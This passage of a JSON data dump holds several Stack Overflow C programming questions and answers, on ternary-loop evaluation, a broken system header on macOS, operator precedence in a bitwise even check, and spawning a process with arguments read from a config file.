[{"tags": ["c"], "comments": [{"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1457568073, "post_id": 35905081, "comment_id": 59470495, "body": "The <code>while</code> condition seems to have been written with the intent to confuse. Anyone wiring such code should be should be shot... a book on writing readable code."}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1457568137, "post_id": 35905081, "comment_id": 59470519, "body": "And to address your question, did you debug it? This would be very easy to answer on your own."}, {"owner": {"reputation": 372, "user_id": 2227925, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4dd98a63224dbb1cad354ab9c8dead5e?s=128&d=identicon&r=PG", "display_name": "BryanT", "link": "https://stackoverflow.com/users/2227925/bryant"}, "reply_to_user": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "edited": false, "score": 0, "creation_date": 1457568753, "post_id": 35905081, "comment_id": 59470727, "body": "I agree with @Carcigenicate - I&#39;ve never seen and would never use a ternary in a while."}, {"owner": {"reputation": 35578, "user_id": 3000206, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/BK1fo.jpg?s=128&g=1", "display_name": "Carcigenicate", "link": "https://stackoverflow.com/users/3000206/carcigenicate"}, "reply_to_user": {"reputation": 372, "user_id": 2227925, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4dd98a63224dbb1cad354ab9c8dead5e?s=128&d=identicon&r=PG", "display_name": "BryanT", "link": "https://stackoverflow.com/users/2227925/bryant"}, "edited": false, "score": 0, "creation_date": 1457573683, "post_id": 35905081, "comment_id": 59472230, "body": "@BryanT This is the first time I&#39;ve ever seen it used like this. I&#39;ve seen a million ternarys, and this took me longer than I&#39;m willing to admit to figure out."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 372, "user_id": 2227925, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4dd98a63224dbb1cad354ab9c8dead5e?s=128&d=identicon&r=PG", "display_name": "BryanT", "link": "https://stackoverflow.com/users/2227925/bryant"}, "edited": false, "score": 0, "creation_date": 1457575361, "post_id": 35905081, "comment_id": 59472699, "body": "@BryanT <code>while (x ? f() : g())</code> is reasonable"}, {"owner": {"reputation": 372, "user_id": 2227925, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4dd98a63224dbb1cad354ab9c8dead5e?s=128&d=identicon&r=PG", "display_name": "BryanT", "link": "https://stackoverflow.com/users/2227925/bryant"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1457579428, "post_id": 35905081, "comment_id": 59473880, "body": "@M.M - that I can understand at first glance. Unlike the one in the question."}], "answers": [{"comments": [{"owner": {"reputation": 372, "user_id": 2227925, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/4dd98a63224dbb1cad354ab9c8dead5e?s=128&d=identicon&r=PG", "display_name": "BryanT", "link": "https://stackoverflow.com/users/2227925/bryant"}, "edited": false, "score": 0, "creation_date": 1457568771, "post_id": 35905127, "comment_id": 59470736, "body": "So j is never really tested (under the initial conditions of i=2 and j=2). And it never gets printed or used."}], "tags": [], "owner": {"reputation": 16851, "user_id": 5460719, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e0f2a855c86ad12fc2988d3948b69ec6?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Karzes", "link": "https://stackoverflow.com/users/5460719/tom-karzes"}, "is_accepted": true, "score": 3, "last_activity_date": 1457568194, "creation_date": 1457568194, "answer_id": 35905127, "question_id": 35905081, "link": "https://stackoverflow.com/questions/35905081/why-is-the-output-1-is-it-because-its-true/35905127#35905127", "title": "Why is the output 1? is it because it&#39;s true?", "body": "<p>The <code>while</code> expression, <code>i+1?--i:j++</code>, first checks to see if <code>i+1</code> is non-zero.  If so, then it evaluates <code>--i</code>, using it as the <code>while</code> test.  If not, it evaluates <code>j++</code>, using it as the <code>while</code> test.</p>\n\n<p>Initially <code>i</code> is 2, so <code>i+1</code> is 3 which is non-zero.  So it evaluates <code>--i</code>, which is 1, and <code>i</code> is now 1.  It then executes the body, printing 1.</p>\n\n<p>The second time around, <code>i</code> is 1, so <code>i+1</code>is 2 which is non-zero.  So it again evaluates <code>--i</code>, which is 0, and <code>i</code> is now 0.  It then exits the loop, since the value of the <code>while</code> expression is 0.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 5943586, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-TYO3UY_Gd6o/AAAAAAAAAAI/AAAAAAAAAQM/oA8itwJ3eaU/photo.jpg?sz=128", "display_name": "Neil H", "link": "https://stackoverflow.com/users/5943586/neil-h"}, "is_accepted": false, "score": 0, "last_activity_date": 1457588478, "creation_date": 1457588478, "answer_id": 35908488, "question_id": 35905081, "link": "https://stackoverflow.com/questions/35905081/why-is-the-output-1-is-it-because-its-true/35908488#35908488", "title": "Why is the output 1? is it because it&#39;s true?", "body": "<p>This is very confusing but easier to understand if you break the ternary expression out of the while.</p>\n\n<pre><code>x = i+1?--i:j++;\n</code></pre>\n\n<p>the value of x will determine whether the while continues or not. </p>\n\n<p>then the value of x would be as such: </p>\n\n<pre><code>(i = 2, j = 2)\nx = i+1?--i:j++ = 3 ? --i : _ // i + 1 == 3 which != 0, so x = --i which is 1, j is ignored\n(i = 1, j = 2)\nx = i+1?--i:j++ = 2 ? --i : _ // i + 1 == 2 which != 0, so x = --i which is 0, j is ignored\n</code></pre>\n\n<p>at this point while(x) would break out of the loop because x = 0 = false. \nThe printf is only called once, with the value of x which at that point is 1</p>\n"}], "owner": {"reputation": 21, "user_id": 6042196, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fcec4c43116c158c00590c12578f71c?s=128&d=identicon&r=PG&f=1", "display_name": "kev", "link": "https://stackoverflow.com/users/6042196/kev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1274, "favorite_count": 0, "accepted_answer_id": 35905127, "answer_count": 2, "score": 0, "last_activity_date": 1457588478, "creation_date": 1457567890, "question_id": 35905081, "link": "https://stackoverflow.com/questions/35905081/why-is-the-output-1-is-it-because-its-true", "title": "Why is the output 1? is it because it&#39;s true?", "body": "<p>The while part confuses me, when it says j++ does it j=2 or 3?</p>\n\n<pre><code>#include &lt;stdio.h&gt; \nint main() {\nint i=2,j=2;\nwhile(i+1?--i:j++) \n    printf(\"%d\",i);\nreturn 0;\n}\n</code></pre>\n"}, {"tags": ["c", "osx-mavericks"], "comments": [{"owner": {"reputation": 34083, "user_id": 1287251, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/IQkBy.png?s=128&g=1", "display_name": "Cornstalks", "link": "https://stackoverflow.com/users/1287251/cornstalks"}, "edited": false, "score": 1, "creation_date": 1457568173, "post_id": 35905046, "comment_id": 59470529, "body": "If it helps, I don&#39;t even have <code>&#47;usr&#47;local&#47;include</code> (OS X 10.11.3 with Xcode 7.2.1). You might be able to just nuke that directory, depending on what you have installed."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1457568665, "post_id": 35905046, "comment_id": 59470695, "body": "For the C command line tools, the default header search path is <code>Applications&#47;Xcode.app&#47;...&#47;include</code>. In other words, the system headers are inside the Xcode app itself, not in <code>&#47;usr&#47;local&#47;include</code>. Can&#39;t say what Ruby does."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457569429, "post_id": 35905046, "comment_id": 59470990, "body": "How about restoring from your Time Machine backup?"}, {"owner": {"reputation": 21, "user_id": 2536146, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e86b255432ec7c869ba3978ca118f084?s=128&d=identicon&r=PG", "display_name": "Michael Frazis", "link": "https://stackoverflow.com/users/2536146/michael-frazis"}, "edited": false, "score": 0, "creation_date": 1458092046, "post_id": 35905046, "comment_id": 59701376, "body": "I ended up reinstalling OS X - lesson learned - don&#39;t play around with those files!"}], "owner": {"reputation": 21, "user_id": 2536146, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e86b255432ec7c869ba3978ca118f084?s=128&d=identicon&r=PG", "display_name": "Michael Frazis", "link": "https://stackoverflow.com/users/2536146/michael-frazis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 841, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1457567983, "creation_date": 1457567685, "last_edit_date": 1457567983, "question_id": 35905046, "link": "https://stackoverflow.com/questions/35905046/fixing-usr-local-include-string-h-on-mac", "title": "Fixing /usr/local/include/string.h on Mac", "body": "<p>I can no longer compile any C or ruby code, as I have messed up /usr/local/include. </p>\n\n<p>This is the error I get when doing anything involving C, including making a new rails application. </p>\n\n<p>I am certain I have done something with /usr/local/include when I was playing around with C. </p>\n\n<p>I've reinstalled everything a number of times, including XCode and Command Line Tools. </p>\n\n<p>Does anyone have any suggestions? Would be much appreciated!</p>\n\n<pre><code>*Fetching gem metadata from https://rubygems.org/...........\nFetching version metadata from https://rubygems.org/...\nFetching dependency metadata from https://rubygems.org/..\nResolving dependencies....\nUsing rake 11.0.1\nUsing i18n 0.7.0\nInstalling json 1.8.3 with native extensions\n\nGem::Installer::ExtensionBuildError: ERROR: Failed to build gem native extension.\n\n    /System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/bin/ruby extconf.rb\ncreating Makefile\n\nmake \"DESTDIR=\"\ncompiling generator.c\nIn file included from generator.c:1:\nIn file included from ./../fbuffer/fbuffer.h:5:\nIn file included from /System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/include/ruby-2.0.0/ruby.h:33:\nIn file included from /System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/include/ruby-2.0.0/ruby/ruby.h:51:\n/usr/local/include/string.h:44:1: error: unknown type name '__BEGIN_NAMESPACE_STD'\n__BEGIN_NAMESPACE_STD\n^\n/usr/local/include/string.h:46:1: error: expected identifier or '('\nextern void *memcpy (void *__restrict __dest, const void *__restrict __src,\n^\n/usr/local/include/string.h:51:6: error: expected function body after function declarator\n     __THROW __nonnull ((1, 2));\n     ^*\n</code></pre>\n"}, {"tags": ["c", "bit-manipulation", "bitwise-operators", "bitwise-and", "uint64"], "comments": [{"owner": {"reputation": 18300, "user_id": 212870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51619fe88436dc413b2c6e9498835646?s=128&d=identicon&r=PG", "display_name": "Alan Stokes", "link": "https://stackoverflow.com/users/212870/alan-stokes"}, "edited": false, "score": 1, "creation_date": 1457566003, "post_id": 35904656, "comment_id": 59469741, "body": "If you&#39;re not certain of the operator precedence rules, put in the extra parentheses. Also if you are certain."}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1457566018, "post_id": 35904656, "comment_id": 59469747, "body": "If this is C++, why not use <code>std::cin</code>? This is 100% C code."}, {"owner": {"reputation": 7873, "user_id": 2225104, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/195de66794c596e35bc145c80e9f5515?s=128&d=identicon&r=PG", "display_name": "BitTickler", "link": "https://stackoverflow.com/users/2225104/bittickler"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 2, "creation_date": 1457566097, "post_id": 35904656, "comment_id": 59469778, "body": "@tadman Some like iostream, some hate it and some love-hate it. Nothing wrong with using the old apis."}, {"owner": {"reputation": 14469, "user_id": 2191105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/tPiCW.png?s=128&g=1", "display_name": "David Hoelzer", "link": "https://stackoverflow.com/users/2191105/david-hoelzer"}, "edited": false, "score": 0, "creation_date": 1457566599, "post_id": 35904656, "comment_id": 59469977, "body": "You have an operator precedence issue."}, {"owner": {"reputation": 3, "user_id": 2738126, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000703420285/picture?type=large", "display_name": "Eoin Davey", "link": "https://stackoverflow.com/users/2738126/eoin-davey"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1457566657, "post_id": 35904656, "comment_id": 59470004, "body": "@tadman in this case this program is for a programming competition so I use printf,scanf and bitwise operations as they are much faster, You are correct though, in general practice I would use cin"}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "reply_to_user": {"reputation": 18300, "user_id": 212870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51619fe88436dc413b2c6e9498835646?s=128&d=identicon&r=PG", "display_name": "Alan Stokes", "link": "https://stackoverflow.com/users/212870/alan-stokes"}, "edited": false, "score": 0, "creation_date": 1457567124, "post_id": 35904656, "comment_id": 59470163, "body": "@AlanStokes If you&#39;re not certain of the operator precedence rules, look them up."}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1457578752, "post_id": 35904656, "comment_id": 59473707, "body": "@EoinDavey Faster in what sense? How many billions of operations of this function are you doing?"}], "answers": [{"tags": [], "owner": {"reputation": 18300, "user_id": 212870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/51619fe88436dc413b2c6e9498835646?s=128&d=identicon&r=PG", "display_name": "Alan Stokes", "link": "https://stackoverflow.com/users/212870/alan-stokes"}, "is_accepted": true, "score": 5, "last_activity_date": 1457566146, "creation_date": 1457566146, "answer_id": 35904734, "question_id": 35904656, "link": "https://stackoverflow.com/questions/35904656/c-uint64-t-bitwise-and-check-for-even-number/35904734#35904734", "title": "C++ uint64_t bitwise AND check for even number", "body": "<p><code>x&amp;1ULL==0ULL</code> is equivalent to <code>x&amp;(1ULL==0ULL)</code>. You need <code>(x&amp;1ULL)==0ULL</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 202, "user_id": 1643971, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/9vLem.png?s=128&g=1", "display_name": "Achiko Mezvrishvili", "link": "https://stackoverflow.com/users/1643971/achiko-mezvrishvili"}, "is_accepted": false, "score": 0, "last_activity_date": 1457567111, "creation_date": 1457567111, "answer_id": 35904932, "question_id": 35904656, "link": "https://stackoverflow.com/questions/35904656/c-uint64-t-bitwise-and-check-for-even-number/35904932#35904932", "title": "C++ uint64_t bitwise AND check for even number", "body": "<pre><code>#include \"stdafx.h\"\n#include &lt;stdio.h&gt;\n#include &lt;windows.h&gt;\n#include &lt;stdint.h&gt;\n\n\n\nint main()\n{\n    int n;\n    scanf_s(\"%d\", &amp;n);\n    for (int i = 0; i &lt; n; i++) {\n        uint16_t  s, d;\n        scanf_s(\"%llu %llu\", &amp;s, &amp;d);\n        //try for x\n        uint16_t x;\n        bool stop = false;\n        x = s + d;\n        printf(\"%llu\", x &amp; 1ULL);\n        if ((x &amp; 1ULL) == 0ULL) {\n\n            printf(\"%llu\", x);\n\n            x /= 2;\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>I think  this  should work  anyway  for me  it works</p>\n"}], "owner": {"reputation": 3, "user_id": 2738126, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000703420285/picture?type=large", "display_name": "Eoin Davey", "link": "https://stackoverflow.com/users/2738126/eoin-davey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 497, "favorite_count": 0, "accepted_answer_id": 35904734, "answer_count": 2, "score": 0, "last_activity_date": 1457567111, "creation_date": 1457565650, "last_edit_date": 1457566033, "question_id": 35904656, "link": "https://stackoverflow.com/questions/35904656/c-uint64-t-bitwise-and-check-for-even-number", "title": "C++ uint64_t bitwise AND check for even number", "body": "<p>I have the following code that simply checks if a uint64_t is even, I intended on using a bitwise AND operation to check but it doesn't seem to be working.</p>\n\n<p>This is the code I thought would work first:</p>\n\n<pre><code>int n;\nscanf(\"%d\",&amp;n);\nfor(int i = 0; i &lt; n; i++){\n    uint64_t s,d;\n    scanf(\"%llu %llu\",&amp;s,&amp;d);\n    //try for x\n    uint64_t x;\n    bool stop = false;\n    x = s + d;\n    printf(\"%llu\",x&amp;1ULL); \\\\ This prints 0 when the number is even but\n    if(x&amp;1ULL==0ULL){ \\\\ This check always returns false\n        printf(\"%llu\",x);\n        x/= 2;\n</code></pre>\n\n<p>This code always prints out 0 or 1 if the the number is odd or even but the if statement always returns false. What am I doing wrong? Thanks</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 1, "creation_date": 1457565828, "post_id": 35904654, "comment_id": 59469668, "body": "This is not C++ code, this is C. Removing tag."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1457566080, "post_id": 35904654, "comment_id": 59469770, "body": "Perhaps <code>args</code> should be an array of pointer-to-char, e.g. <code>char *args[10]</code>. I can&#39;t say for sure without seeing the docs for <code>_spawnl</code>."}, {"owner": {"reputation": 95, "user_id": 6042088, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ed8jy.png?s=128&g=1", "display_name": "Spilt_Blood", "link": "https://stackoverflow.com/users/6042088/spilt-blood"}, "edited": false, "score": 0, "creation_date": 1457566152, "post_id": 35904654, "comment_id": 59469792, "body": "<a href=\"https://msdn.microsoft.com/en-us/library/aa273352(v=vs.60).aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/aa273352(v=vs.60).aspx</a> &lt;- here. Also not looking for portability"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1457566450, "post_id": 35904654, "comment_id": 59469918, "body": "So that says <code>int _spawnl( int mode, const char *cmdname, const char *arg0, const char *arg1, ... const char *argn, NULL );</code> which means that after you fill an array of pointer-to-char, you need to call the function like this <code>_spawnl( P_OVERLAY, args[0], args[0], args[1], args[2], NULL )</code>. Note that args[0] would be &quot;prog1.exe&quot;, and the remaining args come from the file."}, {"owner": {"reputation": 95, "user_id": 6042088, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ed8jy.png?s=128&g=1", "display_name": "Spilt_Blood", "link": "https://stackoverflow.com/users/6042088/spilt-blood"}, "edited": false, "score": 0, "creation_date": 1457566843, "post_id": 35904654, "comment_id": 59470069, "body": "Yes that is the functionality im looking for, but im at a loss at how to do it"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457567338, "post_id": 35904654, "comment_id": 59470239, "body": "@Spilt_Blood Maybe there&#39;s a function <code>_spawnv</code> that takes a single array of arguments instead of spreading them out."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457567396, "post_id": 35904654, "comment_id": 59470265, "body": "I was right, there is: <a href=\"https://msdn.microsoft.com/en-us/library/aa273357(v=vs.60).aspx\" rel=\"nofollow noreferrer\">msdn.microsoft.com/en-us/library/aa273357(v=vs.60).aspx</a>"}, {"owner": {"reputation": 95, "user_id": 6042088, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ed8jy.png?s=128&g=1", "display_name": "Spilt_Blood", "link": "https://stackoverflow.com/users/6042088/spilt-blood"}, "edited": false, "score": 0, "creation_date": 1457567511, "post_id": 35904654, "comment_id": 59470297, "body": "i never got that to work, but i can try again"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457567588, "post_id": 35904654, "comment_id": 59470327, "body": "Use <code>_execv</code> to replace the program in the current process instead of spawning a new process."}, {"owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1457567800, "post_id": 35904654, "comment_id": 59470396, "body": "It&#39;s not necessary to write your own readline function, fgets or getline will do."}, {"owner": {"reputation": 95, "user_id": 6042088, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ed8jy.png?s=128&g=1", "display_name": "Spilt_Blood", "link": "https://stackoverflow.com/users/6042088/spilt-blood"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457568116, "post_id": 35904654, "comment_id": 59470516, "body": "@Barmar the file path has spaces in it... i get an error about conversion   main.cpp:57:129: error: cannot convert &#39;const char*&#39; to &#39;const char* const*&#39; for argument &#39;2&#39; to &#39;intptr_t _execv(const char*, const char* const*)&#39;"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457568300, "post_id": 35904654, "comment_id": 59470571, "body": "If you want to be able to pass multiple arguments, it should be <code>char *args[10]</code>, not <code>char args[10]</code>. And your code that parses the line needs to split it into separate strings for each argument. Take a look at <code>strtok()</code> to simplify this."}, {"owner": {"reputation": 95, "user_id": 6042088, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ed8jy.png?s=128&g=1", "display_name": "Spilt_Blood", "link": "https://stackoverflow.com/users/6042088/spilt-blood"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457571196, "post_id": 35904654, "comment_id": 59471534, "body": "@Barmar for some reason _execv does not  call the .exe to be executed... it just silently quits"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457571265, "post_id": 35904654, "comment_id": 59471554, "body": "You must be calling it incorrectly."}, {"owner": {"reputation": 95, "user_id": 6042088, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ed8jy.png?s=128&g=1", "display_name": "Spilt_Blood", "link": "https://stackoverflow.com/users/6042088/spilt-blood"}, "edited": false, "score": 0, "creation_date": 1457571681, "post_id": 35904654, "comment_id": 59471662, "body": "_execv( &quot;prog1.exe&quot;, args );   but as i said b4 the path has a space in it. is this causing the issue"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1457571956, "post_id": 35904654, "comment_id": 59471738, "body": "A char variable can only ever hold one character (not zero, not two or more). Good thing <code>args</code> isn&#39;t a char variable; it&#39;s an <i>array</i> of chars."}], "owner": {"reputation": 95, "user_id": 6042088, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ed8jy.png?s=128&g=1", "display_name": "Spilt_Blood", "link": "https://stackoverflow.com/users/6042088/spilt-blood"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 86, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1457566121, "creation_date": 1457565641, "last_edit_date": 1457566121, "question_id": 35904654, "link": "https://stackoverflow.com/questions/35904654/append-data-from-an-array-to-a-char-variable-in-c", "title": "Append data from an array to a char variable in C", "body": "<p>i have a program that i'm writing, and i need to read in a configuration file. if you can't tell by the way it's written it is a placeholder for another program, it opens the second program in its memory space. I have the readline function all set up, but my \"main\" operation will only support a variable for arguments (unless im incorrect), like this: \"arg1 arg2 arg3...\" I have seen things on the net like 'strcat' and others, but since im not so versed in C these seem to only add a single character. my needed solution would be:</p>\n\n<pre><code>char args[ 10 ];\nFILE *fp=fopen(\"file.cfg\",\"r\");\n\nvoid readLine(FILE* file, char* line, int limit)\n{\n    int i;\n    int read;\n\n    read = fread(line, sizeof(char), limit, file);\n    line[read] = '\\0';\n\n    for(i = 0; i &lt;= read;i++)\n    {\n        if('\\0' == line[i] || '\\n' == line[i] || '\\r' == line[i])\n        {\n            line[i] = '\\0';\n            break;\n        }\n    }\n\n    if(i != read)\n    {\n        fseek(file, i - read + 1, SEEK_CUR);\n    }\n}\n\nint main(void)\n{\n    _spawnl( P_OVERLAY, \"prog1.exe\", \"prog1.exe\", args, NULL );\n    return 0;\n}\n</code></pre>\n\n<p>the 'args' variable in 'int main(void)' would need to be the one that is = line[i].\nunless a complete rewrite would be nessecary.</p>\n\n<p>Also b4 you flame me, i dont want a loop in main, because this program just calls another, then dies. A loop might make it call an infinite number of the same program, and... well that would be bad. thanks in advance!</p>\n"}, {"tags": ["c", "buffer-overflow"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457565938, "post_id": 35904518, "comment_id": 59469715, "body": "You&#39;re using <code>strlen(argv[0])</code>, don&#39;t you mean <code>strlen(argv[1])</code>?"}, {"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": 